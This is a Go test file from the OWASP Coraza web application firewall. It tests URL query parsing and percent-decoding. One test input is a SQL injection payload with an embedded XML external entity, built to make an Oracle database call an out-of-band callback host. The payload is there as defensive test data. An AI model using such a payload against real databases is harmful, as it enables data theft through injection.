// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	q, malformed := ParseQuery(parseQueryInput, '&')
	if !malformed {
		t.Fatal("expected malformed percent encoding")
	}
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func BenchmarkParseQuery(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ParseQuery(parseQueryInput, '&')
	}
}

var queryUnescapePayloads = map[string]struct {
	value     string
	malformed bool
}{
	"sample":    {"sample", false},
	"s%20ample": {"s ample", false},
	"s+ample":   {"s ample", false},
	"s%2fample": {"s/ample", false},
	"s% ample":  {"s% ample", true},
	"s%ssample": {"s%ssample", true},
	"s%00ample": {"s\x00ample", false},
	"%7B%%7d":   {"{%}", true},
	"%7B+%+%7d": {"{ % }", true},
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		if out, malformed := queryUnescape(k); out != v.value || malformed != v.malformed {
			t.Errorf("Error parsing %q, got %q and malformed=%t; expected %q and malformed=%t", k, out, malformed, v.value, v.malformed)
		}
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			queryUnescape(k)
		}
	}
}
